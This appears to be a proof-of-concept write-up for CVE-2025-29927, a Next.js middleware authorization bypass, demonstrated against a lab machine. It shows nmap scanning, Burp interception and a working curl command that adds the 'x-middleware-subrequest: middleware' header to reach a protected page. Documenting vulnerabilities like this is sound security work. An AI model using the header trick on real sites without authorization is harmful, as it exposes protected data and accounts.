# OVERVIEW 
CVE-2025-29927 is a critical security vulnerability affecting Next.js, a popular open-source React framework used for building full-stack web applications. This vulnerability, disclosed on March 21, 2025, allows attackers to bypass authorization checks enforced through Next.js middleware, potentially granting unauthorized access to protected resources. It has been assigned a CVSS score of 9.1, indicating its critical severity due to its ease of exploitation and significant impact.



The issue stems from a flaw in how Next.js handles the x-middleware-subrequest HTTP header, which is intended to prevent infinite loops in middleware execution. Middleware in Next.js is a feature that intercepts incoming requests to perform tasks like authentication, authorization, or routing before they reach the applicationâ€™s routes. However, by crafting a request with a specific value in the x-middleware-subrequest header, an attacker can skip middleware execution entirely, bypassing critical security checks such as authentication or session validation.


# POC
Kindly note that this exploit falls under the category of HTTP-Header vulnerability.

The machine was scanned using `nmap -T4 -sV IP`, and it returned two ports ( 22 and 3000)

![image](https://github.com/user-attachments/assets/39b2cf45-2f31-4b8a-a165-f98856a1e163)


Trying to see what service is running on port 3000, I ran " curl HTTP://IP" and got an HTTP response, which means the port is running an HTTP service
![image](https://github.com/user-attachments/assets/d3d22e83-cd22-4515-a5ac-d920427b0e96)

The page was then accessed via a browser
![image](https://github.com/user-attachments/assets/9cd55715-e9a6-499b-87a0-6cc5f678d34b)


The `Protected page` kept reverting to the homepage each time I tried to access it because it needs a form of authentication before I'd be allowed to view it. The "Protected page" request was intercepted on burpsuite
![image](https://github.com/user-attachments/assets/841a52b7-70a1-4a35-9aa5-cf7afe6a364a)

Then it was modified with the addition of `x-middleware-subrequest: middleware`
![image](https://github.com/user-attachments/assets/7bdd9387-80d2-44ab-960d-546f59f2881e)


This then opened the "protected" page....
![Screenshot from 2025-03-31 12-38-16](https://github.com/user-attachments/assets/fbd3be11-ef21-4a6d-be86-be811f771e93)


__Alternatively, this can be done without Burpsuite__

This would be done by using __CURL__ to add an extra header ( x-middleware-subrequest: middleware) to the HTTP request of the "protected" page. The command below will do the trick
    
 


  The picture below shows the blan response gotten from accessing the "protected" page using the `CURL` command.
  
    http://IP/protected

![image](https://github.com/user-attachments/assets/1f9ffd76-5280-4c45-8335-cb95f04c9a27)

The '/' in the response indicatess Homepage


The picture below shows the "protected" page being opened after running the `CURL` command withe the "x-middleware-subrequest" header

     curl -H "x-middleware-subrequest: middleware" http://IP:3000/protected
![Screenshot from 2025-03-31 13-00-55](https://github.com/user-attachments/assets/0aec4084-c29d-4307-9b1b-41999db96ace)



